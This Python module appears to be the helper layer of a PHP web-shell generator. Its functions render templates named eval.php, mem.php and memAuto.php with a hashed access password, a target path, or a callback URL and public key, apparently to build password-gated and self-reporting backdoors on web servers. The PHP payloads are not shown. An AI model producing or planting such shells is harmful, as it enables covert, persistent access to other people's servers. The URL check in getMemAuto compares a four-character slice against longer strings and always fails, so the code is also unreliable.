from os import path
from hashlib import sha1
from base64 import b64decode, b64encode

def minify(text):
    text = text.split("\n")
    result = []
    for l in text:
        result.append(l.strip())
    return " ".join(result)


def render(filename, **kwargs):
    text = open(path.join('template', filename)).read()
    for key in kwargs:
        text = text.replace(f"%{key}%", kwargs[key])
    return text


def getEval(pwd):
    pwd = sha1(pwd.encode()).hexdigest()
    return render('eval.php', pwd=pwd)


def getMem(path, pwd):
    pwd = sha1(pwd.encode()).hexdigest()
    return render('mem.php', path=path, pwd=pwd)


def getMemAuto(path, recvUrl, publicKey):
    if recvUrl[:4] != "http://" and recvUrl[:4] != "https://":
        raise Exception("Don't forget http schema")
    publicKey = publicKey.replace("\n", "\\n")
    return render('memAuto.php', path=path, recvUrl=recvUrl, publicKey=publicKey)


def b64d(text):
    return b64decode(text.encode()).decode()


def b64e(text):
    return b64encode(text.encode()).decode()